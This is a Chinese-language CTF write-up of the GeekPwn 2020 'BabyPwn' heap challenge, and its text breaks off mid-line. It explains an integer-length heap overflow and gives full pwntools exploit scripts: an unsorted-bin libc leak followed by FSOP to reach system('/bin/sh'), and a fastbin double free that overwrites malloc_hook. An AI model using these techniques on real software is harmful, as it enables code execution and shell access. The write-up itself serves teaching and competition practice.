        <content type="html"><![CDATA[<p><a href="%5Bhttps://github.com/liuzhongchina521/CTFQues/tree/master/GeekPwn2020%E4%BA%91%E9%9D%B6%E5%9C%BA%E6%8C%91%E6%88%98%E8%B5%9B%E7%83%AD%E8%BA%AB%E8%B5%9B%5D(https://github.com/liuzhongchina521/CTFQues/tree/master/GeekPwn2020%E4%BA%91%E9%9D%B6%E5%9C%BA%E6%8C%91%E6%88%98%E8%B5%9B%E7%83%AD%E8%BA%AB%E8%B5%9B)">题目链接</a></p><h1 id="BabyPwn"><a href="#BabyPwn" class="headerlink" title="BabyPwn"></a>BabyPwn</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先我们看一下程序，程序提供了三种操作<code>add, throw_out,show</code>，操作的结构是<code>member</code>，<code>describe</code>是依据用户输入的大小所分配的堆空间，但是输入的大小最大是<code>0x40</code>，即堆块最大为<code>0x50</code></p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/GeekPwn-2020-%E4%BA%91%E9%9D%B6%E5%9C%BA%E6%8C%91%E6%88%98%E8%B5%9B%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/image-20200713142310545.png" alt="image-20200713142310545"></p><p>漏洞函数位于<code>add</code>中读取字符串的函数</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/GeekPwn-2020-%E4%BA%91%E9%9D%B6%E5%9C%BA%E6%8C%91%E6%88%98%E8%B5%9B%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/image-20200713142706711.png" alt="image-20200713142706711"></p><p>注意到<code>length</code>的类型为<code>int</code>，因此存在堆溢出漏洞。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>有两种利用的方式</p><h3 id="方式1"><a href="#方式1" class="headerlink" title="方式1"></a>方式1</h3><p>整体思路为通过<code>unsorted bin</code>泄露<code>libc</code>地址，<code>FSOP</code>进行<code>getshell</code></p><ul><li>释放两个相同大小的<code>chunk</code>，申请<code>chunk</code>的时候将<code>size</code>设置为<code>1</code>，这样就不会读取内容，从而泄露出堆地址</li><li>通过堆溢出伪造<code>chunk</code>，大小为连续申请的几个<code>chunk</code>和，使其释放时进入<code>unsorted bin</code>中，从而获取<code>libc</code>基址</li><li>堆溢出覆写<code>unsorted bin</code>的<code>fd,bk</code>指针，伪造<code>IO_FILE</code>，采用<code>FSOP</code>进行<code>getshell</code></li></ul><p>首先泄露<code>heap</code>的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin pre</span></span><br><span class="line">add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding, prevent merge with top chunk</span></span><br><span class="line">add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">throw_out(<span class="number">1</span>)</span><br><span class="line">throw_out(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add_member(<span class="string">&quot;1212&quot;</span>, <span class="number">0x1</span>, <span class="string">&quot;a&quot;</span>) <span class="comment">#0</span></span><br><span class="line">show_member(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description:&quot;</span>)</span><br><span class="line">heap_address = u64(p.recvline().strip(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap address&quot;</span>, <span class="built_in">hex</span>(heap_address)</span><br></pre></td></tr></table></figure><p>释放完第<code>1,0</code>个<code>chunk</code>的时候，堆的地址就写到了<code>index=0</code>的堆块中，此时打印第<code>0</code>块就可以得到<code>heap address</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add_member(<span class="string">&quot;1212&quot;</span>, <span class="number">0x0</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xf1</span>)) <span class="comment"># 1</span></span><br><span class="line">throw_out(<span class="number">2</span>)</span><br><span class="line">add_member(<span class="string">&quot;1212&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;12&quot;</span>)</span><br><span class="line">show_member(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description:&quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc address&quot;</span>, <span class="built_in">hex</span>(libc.address)</span><br></pre></td></tr></table></figure><p>接着是伪造<code>unsorted bin chunk</code>。我们将<code>chunk</code>的大小设置为<code>0xf1</code>即连续申请的三个<code>0x40</code>的堆块的大小之和，此时不用伪造上下两个<code>chunk</code>。释放之后重新申请一个大小为<code>0x50</code>的堆块，<code>index=3</code>的<code>member</code>恰好就指向了<code>main_arena+88</code>的存储位置，获得<code>lib address</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">throw_out(<span class="number">1</span>)</span><br><span class="line">vtable = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">vtable_address = heap_address + <span class="number">0x20</span> + <span class="number">0x50</span> + <span class="number">0xe0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x51</span>) + p64(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">payload += <span class="string">&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x10</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">21</span> + p64(vtable_address)</span><br><span class="line">payload += vtable</span><br><span class="line">add_member(<span class="string">&quot;1212&quot;</span>, <span class="number">0x0</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;name:&quot;</span>, name)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>FSOP</code>的利用可以参考<a href="%5Bhttps://blog.lyyl.online/2019/10/08/pwnable-tw%E4%B8%AD%E7%9A%84bookwriter/%5D(https://blog.lyyl.online/2019/10/08/pwnable-tw%E4%B8%AD%E7%9A%84bookwriter/)">pwnable.tw的bookwrite</a>。这里简单介绍一下就是，由于我们修改了<code>unsorted bin</code>的<code>bk</code>指针，导致程序认为<code>unsorted bin</code>的堆块大于<code>1</code>个，此时若申请的大小与<code>unsorted bin</code>大小不同，就会将当前处理的<code>unsorted bin</code>的堆块放入<code>small bin</code>中。并进行类似于<code>unlink</code>的操作<code>bck-&gt;fd = unsorted_chunks (av);</code>，就会在我们制定的位置<code>+0x10</code>字节处写入<code>main_arena+88</code>的地址。如果我们将<code>bk</code>指针写为<code>_IO_list_all-0x10</code>的地址，就能覆写<code>IO_list_all</code>指针为<code>main_arena+88</code>。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/GeekPwn-2020-%E4%BA%91%E9%9D%B6%E5%9C%BA%E6%8C%91%E6%88%98%E8%B5%9B%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/image-20200713164327098.png" alt="image-20200713164327098"></p><p>由于我们改写的<code>bk</code>指针不合法，因此会打印错误信息，此时会对每个<code>FILE</code>结构体进行<code>fflush</code>操作，调用<code>_IO_overflow</code>函数。<code>FILE</code>结构体的依次处理主要依靠的是<code>_chain</code>指针，当我们将<code>IO_list_all</code>指针为<code>main_arena+88</code>，其<code>_chain</code>成员变量位于<code>main_arena+184</code>位置即<code>smallbin[5]</code>，<code>chunk</code>大小为<code>0x61</code>。如果我们将<code>unsorted bin</code>的大小设置为<code>0x61</code>，那么<code>_chain</code>将指向我们可控的堆块(<code>unsorted bin</code>)。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/GeekPwn-2020-%E4%BA%91%E9%9D%B6%E5%9C%BA%E6%8C%91%E6%88%98%E8%B5%9B%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/image-20200713165048255.png" alt="image-20200713165048255"></p><p>在堆块中伪造<code>IO_FILE</code>和<code>vtable</code>，将<code>IO_overflow</code>指针伪造为<code>system</code>地址，将<code>IO_FILE</code>头部写入<code>/bin/sh\x00</code>即可以调用<code>system(&#39;/bin/sh&#39;)</code>。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/GeekPwn-2020-%E4%BA%91%E9%9D%B6%E5%9C%BA%E6%8C%91%E6%88%98%E8%B5%9B%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/image-20200713165120403.png" alt="image-20200713165120403"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x555555555090\n&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/windowsDisk/glibc/x64/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10005</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_member</span>(<span class="params">name, des_size, des</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name:&quot;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(des_size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Description:&quot;</span>, des)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_member</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">throw_out</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">member_exit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin pre</span></span><br><span class="line">add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding, prevent merge with top chunk</span></span><br><span class="line">add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">throw_out(<span class="number">1</span>)</span><br><span class="line">throw_out(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add_member(<span class="string">&quot;1212&quot;</span>, <span class="number">0x1</span>, <span class="string">&quot;a&quot;</span>) <span class="comment">#0</span></span><br><span class="line">show_member(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description:&quot;</span>)</span><br><span class="line">heap_address = u64(p.recvline().strip(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap address&quot;</span>, <span class="built_in">hex</span>(heap_address)</span><br><span class="line"></span><br><span class="line">add_member(<span class="string">&quot;1212&quot;</span>, <span class="number">0x0</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xf1</span>)) <span class="comment"># 1</span></span><br><span class="line">throw_out(<span class="number">2</span>)</span><br><span class="line">add_member(<span class="string">&quot;1212&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;12&quot;</span>)</span><br><span class="line">show_member(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description:&quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc address&quot;</span>, <span class="built_in">hex</span>(libc.address)</span><br><span class="line"></span><br><span class="line">throw_out(<span class="number">1</span>)</span><br><span class="line">vtable = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">vtable_address = heap_address + <span class="number">0x20</span> + <span class="number">0x50</span> + <span class="number">0xe0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x51</span>) + p64(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">payload += <span class="string">&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x10</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">21</span> + p64(vtable_address)</span><br><span class="line">payload += vtable</span><br><span class="line">add_member(<span class="string">&quot;1212&quot;</span>, <span class="number">0x0</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;name:&quot;</span>, name)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="方式2"><a href="#方式2" class="headerlink" title="方式2"></a>方式2</h3><p>这种方法在这个比赛中不能使用</p><ul><li><p>伪造<code>unsorted bin</code>泄露<code>libc</code>基址，通方式1相同，在伪造<code>unsorted bin</code>的时候会构造出堆重叠</p></li><li><p><code>double free</code>进行<code>fastbin attack</code>。但是这里最大分配的<code>chunk</code>为<code>0x50</code>。由于程序开启了随机化，因此堆地址的开始为<code>0x55</code>或<code>0x56</code>，因此我们转换一下，将<code>chunk</code>分配在<code>main_arena+37</code>位置处（<code>main_arena+40</code>处存储<code>fastbin[4]</code>起始，即大小为<code>0x60</code>的堆块的地址）。参考<a href="https://ama2in9.top/2019/12/12/HSCTF2019/">HSCTF2019 heard_heap</a></p><blockquote><p>这里需要注意的是由于我们需要覆写之后的top chunk地址，而且有0x40大小可写区域的限制，因此只能选择main_arena+40处进行分配，因此我们需要再次释放一个大小为0x60的堆块。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/GeekPwn-2020-%E4%BA%91%E9%9D%B6%E5%9C%BA%E6%8C%91%E6%88%98%E8%B5%9B%E7%83%AD%E8%BA%AB%E8%B5%9B-WP/image-20200713214315359.png" alt="image-20200713214315359"></p><p>在分配之后我们需要绕过一些检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">       ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br></pre></td></tr></table></figure><p>因此我们需要等待堆地址为<code>0x56</code>起始时才可以成功分配</p></blockquote></li><li><p>分配完成之后，覆写之后位于<code>main_arena+88</code>处的<code>top chunk</code>地址。将<code>top chunk</code>地址覆写为<code>malloc_hook-0x23</code>处的地址，这样就可以分配到<code>malloc_hook</code>的堆块了。覆写<code>one_gadget</code>。</p><blockquote><p>在one_gadget都无法使用的时候可以考虑将malloc_hook的地址填写为realloc+n的地址，进行平衡栈帧，构造one_gadget生效的条件，realloc_hook位置(main_arena-0x18)填写gadget地址。</p></blockquote></li></ul><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x555555555090\n&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/windowsDisk/glibc/x64/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0xcb7e5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_member</span>(<span class="params">name, des_size, des</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name:&quot;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(des_size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Description:&quot;</span>, des)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_member</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">throw_out</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">member_exit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice:&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">    throw_out(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x0</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xa1</span>)) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">    throw_out(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>) <span class="comment"># 2</span></span><br><span class="line">    show_member(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Description:&quot;</span>)</span><br><span class="line">    <span class="comment"># address = p.readline().strip().ljust(8,&quot;\x00&quot;)</span></span><br><span class="line">    libc.address = u64(p.readline().strip(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    <span class="comment"># print &quot;libc address&quot;, address</span></span><br><span class="line">    malloc_hook_address = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    main_arean_address = malloc_hook_address + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;libc address&quot;</span>, <span class="built_in">hex</span>(libc.address)</span><br><span class="line">    add_member(<span class="string">&quot;1212&quot;</span>, <span class="number">0x40</span>, <span class="string">&quot;1&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">    throw_out(<span class="number">1</span>)</span><br><span class="line">    add_member(<span class="string">&quot;12112&quot;</span>, <span class="number">0x0</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>)*<span class="number">8</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(<span class="number">0</span>) + p64(<span class="number">41</span>)) <span class="comment"># 1</span></span><br><span class="line">    throw_out(<span class="number">2</span>) <span class="comment">#0x60</span></span><br><span class="line">    <span class="comment"># double free</span></span><br><span class="line">    throw_out(<span class="number">3</span>)</span><br><span class="line">    throw_out(<span class="number">4</span>)</span><br><span class="line">    throw_out(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># maybe 0x56</span></span><br><span class="line">    fake_chunk_address = main_arean_address - <span class="number">0x13</span> + <span class="number">0x38</span></span><br><span class="line">    add_member(<span class="string">&quot;12112&quot;</span>, <span 